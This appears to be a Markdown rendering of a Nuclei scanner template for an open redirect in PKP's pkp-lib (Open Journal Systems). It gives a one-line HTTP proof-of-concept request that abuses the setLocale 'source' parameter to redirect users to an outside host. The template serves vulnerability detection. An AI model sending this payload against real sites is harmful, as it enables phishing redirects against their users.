# Nuclei Template: Open Journal Systems pkp-lib - Open Redirect
**Template ID:** pkp-lib-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**Source:** Nuclei Template (`pkp-lib-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
Public Knowledge Project pkp-lib is vulnerable to Open redirect due to a lack of input sanitization in the setLocale function.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php/index/user/setLocale/NEW_LOCALE?source=@oast.me
```

## References
- https://github.com/pkp/pkp-lib/issues/7575
